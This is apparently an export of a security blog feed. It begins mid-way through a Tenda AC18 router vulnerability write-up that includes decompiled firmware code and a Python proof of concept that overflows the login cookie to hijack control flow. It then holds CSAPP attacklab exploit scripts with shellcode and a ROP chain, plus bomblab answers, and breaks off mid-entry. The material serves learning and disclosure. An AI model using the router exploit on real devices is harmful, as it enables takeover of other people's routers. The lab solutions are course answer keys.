class="string">&quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetValue(<span class="string">&quot;usb.samba.guest.user&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] )</span><br><span class="line">      doSystemCmd(<span class="string">&quot;busybox deluser %s&quot;</span>, s);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.pwd&quot;</span>, user_input);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.user&quot;</span>, v6);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.pwd&quot;</span>, v7);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.acess&quot;</span>, v5);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.pwd&quot;</span>, user_input);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.user&quot;</span>, v6);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.pwd&quot;</span>, v7);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.acess&quot;</span>, v5);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.remote.acess&quot;</span>, v11);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.remote.port&quot;</span>, v10);</span><br><span class="line">    GetValue(<span class="string">&quot;usb.samba.enable&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">42</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">42</span>, <span class="number">2</span>);</span><br><span class="line">    GetValue(<span class="string">&quot;usb.ftp.enable&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      v2 = doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">43</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v2 = doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">43</span>, <span class="number">2</span>);</span><br><span class="line">    CommitCfm(v2);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here is the payload:</p><p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetSambaCfg_payload.png" data-caption="SetSambaCfg_payload"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetSambaCfg_payload.png" alt="SetSambaCfg_payload"></a></p><p>qemu-system emulation respond with:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: asdf: not found</span><br></pre></td></tr></table></figure><h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="CVE-2018-5767"><a href="#CVE-2018-5767" class="headerlink" title="CVE-2018-5767"></a>CVE-2018-5767</h3><p>Reference from <a href="https://www.cvedetails.com/cve/CVE-2018-5767/">CVE-2018-5767</a>, there is an unchecked <code>sscanf</code> read in the request package’s cookie section which happened in <code>R7WebsSecurityHandler</code> function. </p><p>To reach the vulnerable section, we must pass a bunch of checks:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(url, <span class="string">&quot;/public/&quot;</span>, <span class="number">8u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/lang/&quot;</span>, <span class="number">6u</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">&quot;img/main-logo.png&quot;</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">&quot;reasy-ui-1.0.3.js&quot;</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/favicon.ico&quot;</span>, <span class="number">0xC</span>u)</span><br><span class="line">  &amp;&amp; *(_DWORD *)(a1 + <span class="number">152</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/kns-query&quot;</span>, <span class="number">0xA</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/wdinfo.php&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strlen</span>(url) != <span class="number">1</span> || *url != <span class="number">47</span>)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/telnet&quot;</span>, <span class="number">0xE</span>u) || g_Pass[<span class="number">0</span>] &amp;&amp; <span class="built_in">strcmp</span>(g_Pass, <span class="string">&quot;YWRtaW4=&quot;</span>))<span class="comment">// </span></span><br><span class="line">                                              <span class="comment">// CVE-2018-5770 Unauthenticated Start of Telnetd </span></span><br><span class="line">                                              <span class="comment">// CVE-2018-5768 Hard Coded Accounts</span></span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/fast_setting&quot;</span>, <span class="number">0x14</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/ate&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/InsertWhite&quot;</span>, <span class="number">0x13</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/yun_safe.html&quot;</span>, <span class="number">0xE</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getWanConnectStatus&quot;</span>, <span class="number">0x1B</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getProduct&quot;</span>, <span class="number">0x12</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getRebootStatus&quot;</span>, <span class="number">0x17</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/redirect.html&quot;</span>, <span class="number">0xE</span>u)</span><br><span class="line">  &amp;&amp; (i &lt;= <span class="number">2</span> || <span class="built_in">strncmp</span>(url, <span class="string">&quot;/loginerr.html&quot;</span>, <span class="number">0xE</span>u)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// other code</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(url, <span class="string">&quot;/index.html&quot;</span>, <span class="number">0xB</span>u) &amp;&amp; GetValue(<span class="string">&quot;ali.reset.cfg&quot;</span>, nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(nptr, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      sub_2B730(a1, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(s, url, <span class="number">0xFF</span>u);</span><br><span class="line">  v42 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    *v42 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// !! vulnerable !!</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">184</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = <span class="built_in">strstr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">184</span>), <span class="string">&quot;password=&quot;</span>);<span class="comment">// sscanf read from request&#x27;s without any limit</span></span><br><span class="line">    <span class="keyword">if</span> ( v44 )</span><br><span class="line">      <span class="built_in">sscanf</span>(v44, <span class="string">&quot;%*[^=]=%[^;];*&quot;</span>, v34);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">sscanf</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">184</span>), <span class="string">&quot;%*[^=]=%[^;];*&quot;</span>, v34);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>This shows that <code>url</code> cannot be empty, or equal to <code>\</code>, or have a length equal to 1, or equal to any other strings shown in the big <code>strcmp</code> section. </p><p>After entering the if section, <code>url</code> also cannot be <code>inde.html</code>.</p><p>Finally enter the if the section that <code>sscanf</code> reads the user input, if we construct the payload properly, it can cause buffer overflow. </p><p>Here is a simple POC:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.10.1&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://%s/goform/execCommand&quot;</span> % ip</span><br><span class="line">cookies = &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;password=&quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">456</span> + <span class="string">&quot;BBBB&quot;</span>&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(ret.text)</span><br></pre></td></tr></table></figure><p>GDB view (successfully hijack the control flow to <code>0x42424242</code>):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> R0   0x0</span><br><span class="line">*R1   0xff605268 &lt;- 0</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line">*R4   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R5   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R6   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R7   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R8   0xe5d0 &lt;- mov    ip, sp /* 0xe1a0c00d */</span><br><span class="line">*R9   0x2dd04 &lt;- push   &#123;r4, fp, lr&#125; /* 0xe92d4810 */</span><br><span class="line">*R10  0xfffef6b8 &lt;- 0</span><br><span class="line">*R11  0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R12  0xff74dedc -&gt; 0xff743a50 &lt;- mov    r3, r0 /* 0xe1a03000 */</span><br><span class="line">*SP   0xfffeec58 -&gt; 0x103f00 &lt;- ldrbvs r0, [r0, r0]! /* 0x67f00000 */</span><br><span class="line">*PC   0x42424242 (&#x27;BBBB&#x27;)</span><br></pre></td></tr></table></figure><h3 id="CVE-2022-28556"><a href="#CVE-2022-28556" class="headerlink" title="CVE-2022-28556"></a>CVE-2022-28556</h3><p>This vulnerability happened in the function <code>formSetPPTPServer</code>. It uses <code>sscanf</code> to format the data from the HTTP requests. However, it doesn’t correctly limit the length of the input. </p><p>It first gets the parameter of <code>serverEn, startIp, endIp</code> from the post request. Then, it checks if <code>serverEn = 0</code>, if not, then check if <code>serverEn = 1</code>, if it equals 1, and if both <code>startIp</code> and <code>endIp</code> have data in it, the control flow will reach the vulnerable <code>sscanf</code> part.</p><p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code1.png" data-caption="SetPptpServerCfg_code1"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code1.png" alt="SetPptpServerCfg_code1"></a></p><p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code2.png" data-caption="SetPptpServerCfg_code2"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code2.png" alt="SetPptpServerCfg_code2"></a></p><p>So the poc is quite simple, satisfied all requirements above and crash the process.</p><p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_poc.png" data-caption="SetPptpServerCfg_poc"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_poc.png" alt="SetPptpServerCfg_poc"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.tendacn.com/us/download/detail-3852.html">https://www.tendacn.com/us/download/detail-3852.html</a></p><p><a href="https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68">https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68</a></p><p><a href="https://www.anquanke.com/post/id/213416">https://www.anquanke.com/post/id/213416</a></p><p><a href="https://fidusinfosec.com/tenda-ac15-unauthenticated-telnetd-start-cve-2018-5770/">https://fidusinfosec.com/tenda-ac15-unauthenticated-telnetd-start-cve-2018-5770/</a></p><p><a href="https://nosec.org/home/detail/4634.html">https://nosec.org/home/detail/4634.html</a></p><p><a href="https://www.anquanke.com/post/id/204403">https://www.anquanke.com/post/id/204403</a></p><p><a href="https://www.anquanke.com/post/id/231445">https://www.anquanke.com/post/id/231445</a></p><p><a href="https://xz.aliyun.com/t/7357?spm=5176.12901015.0.i12901015.65db525cQBSuI3&amp;accounttraceid=1d7f8f3f083842dba12fa62662c34665asfk#toc-1">https://xz.aliyun.com/t/7357?spm=5176.12901015.0.i12901015.65db525cQBSuI3&amp;accounttraceid=1d7f8f3f083842dba12fa62662c34665asfk#toc-1</a></p><p><a href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">https://wzt.ac.cn/2021/05/28/QEMU-networking/</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2018-5767 </tag>
            
            <tag> CVE-2018-5768 </tag>
            
            <tag> CVE-2018-5770 </tag>
            
            <tag> CVE-2018-16334 </tag>
            
            <tag> CVE-2020-15916 </tag>
            
            <tag> CVE-2022-28556 </tag>
            
            <tag> CVE-2022-28557 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwncollege Summary</title>
      <link href="/2022/08/02/Pwncollege-Summary/"/>
      <url>/2022/08/02/Pwncollege-Summary/</url>
      
        <content type="html"><![CDATA[<p>About three days ago, I finished all the challenges in the <a href="https://pwn.college/">pwn.college</a> and successfully earned blue belt, <a href="https://pwn.college/belts">ranking here</a>. </p><p><a data-fancybox="gallery" data-src="/2022/08/02/Pwncollege-Summary/assets/yellow_belt.jpg" data-caption="yellow belt ceremony"><img src="/2022/08/02/Pwncollege-Summary/assets/yellow_belt.jpg" alt="yellow belt ceremony"></a></p><p><a data-fancybox="gallery" data-src="/2022/08/02/Pwncollege-Summary/assets/blue_belt.jpg" data-caption="blue belt ceremony"><img src="/2022/08/02/Pwncollege-Summary/assets/blue_belt.jpg" alt="blue belt ceremony"></a></p><p>It took me about 7 full months to finish this wonderful journey. This blog is not so much a “summary” as a milestone in my progress in the field of binary security. Unfortunately, due to the writeup policy by pwncollege, we are not allowed to share any writeup of the challenges because it would spoil the experience of new coming ASU students and other hackers who want to start or learn more. </p><p>For the next step, I will follow the CTF team, r3kapig, fighting for more CTFs and doing more projects with Atum. But one thing different is, they are a lot harder than what I did here, in pwncollege. </p><p>This is a quote that I use to commemorate my first CTF, which I am unable to solve any challenge in it. I would still like to reuse it here. Although it is not a good experience for a beginner, I know I will face more failure in the future than here.</p><blockquote><p>“Ever tried. Ever failed. No matter. Try Again. Fail again. Fail better.” – Beckett</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwncollege </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP attacklab</title>
      <link href="/2022/06/16/CSAPP-attacklab/"/>
      <url>/2022/06/16/CSAPP-attacklab/</url>
      
        <content type="html"><![CDATA[<p>This is the writeup for CSAPP Attacklab</p><p>Tool: IDA&#x2F;Ghidra, pwndbg, pwntools</p><h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>Simple stack overflow, without the protection of canary and ASLR. Debugger check the stack frame, find out that total 40 bytes offset away from the return address. So make a 40 bytes padding then follow the address of touch1. Done</p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>It checks the argument of touch2 to be the cookie that within the <code>cookie.txt</code> file. The stack is executable, so inject a shellcode into the stack then return to the stack to execute the shellcode to make <code>rdi</code> to be the correct cookie. </p><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>Level 3 require a pointer to check, however, some part of the stack will be wiped out by the function <code>hexmatch</code> and <code>touch3</code>, so store the string in somewhere away from the place they wipe out will be fine. </p><p>Solution for Part I:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.encoding = <span class="string">&quot;latin&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie = p32(<span class="number">0x59b997fa</span>)</span><br><span class="line">touch1 = p32(<span class="number">0x4017c0</span>)</span><br><span class="line">touch2 = p32(<span class="number">0x4017ec</span>)</span><br><span class="line">touch3 = p32(<span class="number">0x4018fa</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug([&quot;./ctarget&quot;, &quot;-q&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;./ctarget&quot;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch1</span></span><br><span class="line"><span class="comment"># p.sendline(b&quot;A&quot;*40 + touch1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch2</span></span><br><span class="line"><span class="comment"># shellcode = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     mov rdi, 0x59b997fa</span></span><br><span class="line"><span class="comment">#     push 0x4017ec</span></span><br><span class="line"><span class="comment">#     ret</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(len(asm(shellcode)))</span></span><br><span class="line"><span class="comment"># p.sendline(asm(shellcode) + b&quot;A&quot;*27 + p32(0x5561dc78));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch3</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi, 0x5561dca8</span></span><br><span class="line"><span class="string">    push 0x4018fa</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line">p.sendline(asm(shellcode) + <span class="string">b&quot;A&quot;</span>*<span class="number">27</span> + p64(<span class="number">0x5561dc78</span>) + <span class="string">b&quot;59b997fa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.readall().decode())</span><br></pre></td></tr></table></figure><h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>Same with Level 2, but with random memory address. So we are unable to access the code that we inject to the stack. The core part on <code>touch2</code> is to make <code>rdi = cookie</code>. With the help of ROPgadgets, we can find from the <code>farm.c</code> that there are two place to reach our goal:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getval_280:</span><br><span class="line">0x4019cc</span><br><span class="line">58   pop rax</span><br><span class="line">90   nop</span><br><span class="line">c3   ret</span><br><span class="line"></span><br><span class="line">setval_426:</span><br><span class="line">at 0x4019c5</span><br><span class="line">48 89 c7 mov rdi, rax</span><br><span class="line">90  nop</span><br><span class="line">c3  ret</span><br></pre></td></tr></table></figure><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>Same thing. Try to make <code>[rdi] = cookie</code>. You may find a gadget in <code>setval_350</code> that store <code>rsp</code> to <code>rax</code>. But the hard thing is that if we place where <code>rsp</code> is pointing to be the cookie value, we are unable to further jump to other places because the cookie take the place that original used for another return address. </p><p>So, in order to bypass this issue, we can add an offset to <code>rsp</code> by <code>add_xy</code> function. So that it will point away from current position and we can store cookie string to other places. </p><p>Solution for Part II:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.encoding = <span class="string">&quot;latin&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie = p32(<span class="number">0x59b997fa</span>)</span><br><span class="line">touch2 = p32(<span class="number">0x4017ec</span>)</span><br><span class="line">touch3 = p32(<span class="number">0x4018fa</span>)</span><br><span class="line"></span><br><span class="line">p = gdb.debug([<span class="string">&quot;./rtarget&quot;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="comment"># p = process([&quot;./rtarget&quot;, &quot;-q&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch2</span></span><br><span class="line"><span class="comment"># p.sendline(b&quot;A&quot;*40 + p64(0x4019cc) + p64(0x59b997fa) + p64(0x4019c5) + p64(0x4017ec));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch3</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">40</span> + p64(<span class="number">0x4019cc</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x401a42</span>) + p64(<span class="number">0x401a69</span>) + p64(<span class="number">0x401a27</span>) + p64(<span class="number">0x401a06</span>) + p64(<span class="number">0x4019c5</span>)</span><br><span class="line">        + p64(<span class="number">0x4019d6</span>) + p64(<span class="number">0x4019c5</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">b&quot;59b997fa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.readall().decode())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP bomblab</title>
      <link href="/2022/05/27/CSAPP-bomblab/"/>
      <url>/2022/05/27/CSAPP-bomblab/</url>
      
        <content type="html"><![CDATA[<p>This is the writeup for CSAPP bomblab</p><p>Tool: IDA&#x2F;Ghidra, pwndbg</p><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><p>Phase 1 compare input with a string originally inside the program. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><p>So input the same string can defuse the bomb</p><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><p>Phase 2 read in 6 numbers in sequence. There is a while loop checking that the number in the back should be twice the one in the front. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><p>Phase 3 read in 2 numbers. The first number used as a variable in a switch statement of total 8 choices. From the disassembler, we can know different value that will be compared with our second number. So find the right case you want to choose and input them as pairs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 207</span><br></pre></td></tr></table></figure><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><p>Phase 4 also read in 2 numbers. The first number should be less than or equal to <code>0xE = 14</code>. There is a function called <code>func4</code> that is a recursive function, the input number should make its return value equal to 0. After some test, input <code>0</code> can return <code>0</code>, so just simply solved it. </p><p>Then the program just simply compare the second value with 0. If it is, you will pass the test, otherwise the bomb will explode. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0</span><br></pre></td></tr></table></figure><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><p>Phase 6 read in string with length 6, encrypt&#x2F;decrypt it in some way and compare the result of the encryption&#x2F;decryption with <code>flyers</code>. </p><p>It take an <code>AND</code> operation to the input string byte, which result only the half of the byte. Ex. <code>f = 0x66; 0x66 AND 0x0f = 0x06</code>. The program use the last 